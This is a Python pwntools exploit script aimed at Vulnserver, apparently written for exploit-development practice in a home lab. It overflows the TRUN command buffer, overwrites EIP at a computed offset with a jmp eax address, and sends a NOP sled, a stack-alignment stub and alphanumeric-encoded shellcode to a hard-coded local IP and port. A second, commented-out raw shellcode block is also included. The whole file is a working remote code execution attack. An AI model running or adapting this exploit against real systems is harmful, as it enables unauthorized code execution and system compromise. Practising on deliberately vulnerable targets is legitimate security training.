from pwn import * # pylint: disable=unused-wildcard-import
context.log_level = 'debug' # pylint: disable=assigning-non-slot

# IP and port of the target (Vulnserver).
ip = "192.168.1.135"
port = 9999 

# Define the variables with the data we obtained.
cmd = b"TRUN /.:/" # Command used and start of payload.
offset_eip = 2003 + len(cmd)
eip = 0x625011b1 # Address we want to overwrite EIP with, jmp eax in this case.
# eip = 0x625011af # Address we want to overwrite EIP with, jmp esp in this case.

# Here we put the shellcode we want to execute.
# offset_sc = 2017 # Offset of ESP.
shellcode =  b"\x90"*16 # NOP sled for safety.
shellcode += b"\x89\xC4\x83\xEC\x7C" # mov esp,eax; sub esp,0x7c STACK ALIGNMENT!!!!
shellcode += b"VTX630VXH49HHHPhYAAQhZYYYYAAQQDDDd36FFFFTXVj0PPTUPPa301089IIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIIljHmRC0ePC0U0LIZEUao00dNk6000LKPRFlLKbrgdLK0rux6oh7RjWV5akONLElCQqls2tlUpJahOdMWqXGKRL2pRSgNkv2fpLKszellKPL7aRXxcCxc1JqpQlKQIa0gqzsNkriUH8c6ZCynkdtnk5QKfFQ9oLlyQXOTMgqYWdxkPBUYfESqmHxEkamUtqekTQHlKShddWqKcU6NktLrknksh5LFaZslKS4LK7q8PlIQTutQ4ckqKQqf9RzSaioYpaOqOBzLK22xkNmaMaxvSGBS0s0qxD7cCgBaOrtu8pLBW7VVgioXULxj0faWp7pGYjdbtf0QxQ9K0pk30YoIERpf00PpP70Rpg060bHhjfoiOKPkOiEmG1zwuQxKpi8GqP0CX32WpvqslNiYvBJvpcfCg3XMI952TPaKOxUMUO02TDLKOPN38QejLbHzPOEI2BvKOXUE81sbMrDUPLIjCf71Gcg5azV1z6rF9Sf8bYmRFKwCtq45lvaC1lMaTQ4r08Fs0StqD0PsfF62v76qFRnQFpV1CCfU8CIZlwOk6kOzulIKPrnbvpFIoFPPhGxlGuMcPYoyEoKzPnUlbaFE8Y6Z5mmmMio9E5lffcLeZMPYkm0pu4EMkcwuCt2BOSZUPf3iohUAA"
# shellcode += b"\xda\xc7\xb8\x19\xda\x3b\xc4\xd9\x74\x24\xf4\x5b"
# shellcode += b"\x2b\xc9\xb1\x52\x31\x43\x17\x03\x43\x17\x83\xda"
# shellcode += b"\xde\xd9\x31\x20\x36\x9f\xba\xd8\xc7\xc0\x33\x3d"
# shellcode += b"\xf6\xc0\x20\x36\xa9\xf0\x23\x1a\x46\x7a\x61\x8e"
# shellcode += b"\xdd\x0e\xae\xa1\x56\xa4\x88\x8c\x67\x95\xe9\x8f"
# shellcode += b"\xeb\xe4\x3d\x6f\xd5\x26\x30\x6e\x12\x5a\xb9\x22"
# shellcode += b"\xcb\x10\x6c\xd2\x78\x6c\xad\x59\x32\x60\xb5\xbe"
# shellcode += b"\x83\x83\x94\x11\x9f\xdd\x36\x90\x4c\x56\x7f\x8a"
# shellcode += b"\x91\x53\xc9\x21\x61\x2f\xc8\xe3\xbb\xd0\x67\xca"
# shellcode += b"\x73\x23\x79\x0b\xb3\xdc\x0c\x65\xc7\x61\x17\xb2"
# shellcode += b"\xb5\xbd\x92\x20\x1d\x35\x04\x8c\x9f\x9a\xd3\x47"
# shellcode += b"\x93\x57\x97\x0f\xb0\x66\x74\x24\xcc\xe3\x7b\xea"
# shellcode += b"\x44\xb7\x5f\x2e\x0c\x63\xc1\x77\xe8\xc2\xfe\x67"
# shellcode += b"\x53\xba\x5a\xec\x7e\xaf\xd6\xaf\x16\x1c\xdb\x4f"
# shellcode += b"\xe7\x0a\x6c\x3c\xd5\x95\xc6\xaa\x55\x5d\xc1\x2d"
# shellcode += b"\x99\x74\xb5\xa1\x64\x77\xc6\xe8\xa2\x23\x96\x82"
# shellcode += b"\x03\x4c\x7d\x52\xab\x99\xd2\x02\x03\x72\x93\xf2"
# shellcode += b"\xe3\x22\x7b\x18\xec\x1d\x9b\x23\x26\x36\x36\xde"
# shellcode += b"\xa1\xf9\x6f\xe1\x01\x92\x6d\xe1\x70\x3e\xfb\x07"
# shellcode += b"\x18\xae\xad\x90\xb5\x57\xf4\x6a\x27\x97\x22\x17"
# shellcode += b"\x67\x13\xc1\xe8\x26\xd4\xac\xfa\xdf\x14\xfb\xa0"
# shellcode += b"\x76\x2a\xd1\xcc\x15\xb9\xbe\x0c\x53\xa2\x68\x5b"
# shellcode += b"\x34\x14\x61\x09\xa8\x0f\xdb\x2f\x31\xc9\x24\xeb"
# shellcode += b"\xee\x2a\xaa\xf2\x63\x16\x88\xe4\xbd\x97\x94\x50"
# shellcode += b"\x12\xce\x42\x0e\xd4\xb8\x24\xf8\x8e\x17\xef\x6c"
# shellcode += b"\x56\x54\x30\xea\x57\xb1\xc6\x12\xe9\x6c\x9f\x2d"
# shellcode += b"\xc6\xf8\x17\x56\x3a\x99\xd8\x8d\xfe\xb9\x3a\x07"
# shellcode += b"\x0b\x52\xe3\xc2\xb6\x3f\x14\x39\xf4\x39\x97\xcb"
# shellcode += b"\x85\xbd\x87\xbe\x80\xfa\x0f\x53\xf9\x93\xe5\x53"
# shellcode += b"\xae\x94\x2f"

# Create our payload.
payload = fit({
    0:cmd + shellcode,
    offset_eip:eip,
    # offset_sc:shellcode,
    },length=5000)

# Connect to the target and send the payload.
io = remote(ip,port)
io.readline()
io.sendline(payload)